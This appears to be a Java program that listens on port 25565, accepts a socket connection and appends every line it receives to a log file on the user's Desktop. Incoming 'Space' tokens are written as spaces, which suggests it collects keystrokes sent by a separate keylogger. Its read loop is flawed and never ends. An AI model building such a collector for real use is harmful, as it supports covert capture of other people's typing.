import java.io.*;
import java.net.*;
public class ashiatonikki
{
  public static void main(String[] args) throws Exception
  {
	  for(;;){
      @SuppressWarnings("resource")
      ServerSocket sersock = new ServerSocket(25565);
      System.out.println("Ready to receive files");
      Socket sock = sersock.accept( );                          
      InputStream istream = sock.getInputStream();
      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
      String receiveMessage;  
      for(;;)
      { 
    	  if((receiveMessage = receiveRead.readLine()) != null)  
          {
        	 System.out.println(receiveMessage); 
        	 record(receiveMessage);
          }
      } 
	  }
  }
  public static void record(String x) {
		try {
			File log = new File("C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt");
			if(!log.exists()) {
				log.createNewFile();
			}
			String filename = "C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// System.out.println("rec " + x);
			if(x.matches("Space")) {
				out.print(" ");
				out.close();
			} else {
			out.print(x);
			out.close();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
